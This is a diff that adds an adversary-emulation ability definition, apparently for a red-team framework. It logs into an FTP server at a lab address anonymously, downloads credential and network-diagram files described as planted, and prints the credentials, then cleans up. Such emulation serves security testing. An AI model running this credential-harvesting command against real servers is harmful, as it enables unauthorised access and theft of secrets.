@@ -1,0 +1,22 @@
+- id: ia02-ftp-anon
+  name: FTP Anonymous Login and Credential Harvest
+  description: Login to FTP server anonymously and steal planted credential files
+  tactic: initial-access
+  technique:
+    attack_id: T1078.001
+    name: Valid Accounts - Default Accounts
+  platforms:
+    linux:
+      sh:
+        command: |
+          ftp -n 10.0.20.40 <<'EOF'
+          user anonymous ""
+          get credentials.txt /tmp/ftp_creds.txt
+          get network_diagram.txt /tmp/ftp_network.txt
+          quit
+          EOF
+          cat /tmp/ftp_creds.txt 2>/dev/null || echo 'FTP anon login attempted'
+        cleanup: |
+          rm -f /tmp/ftp_creds.txt /tmp/ftp_network.txt
+  singleton: false
+  repeatable: false
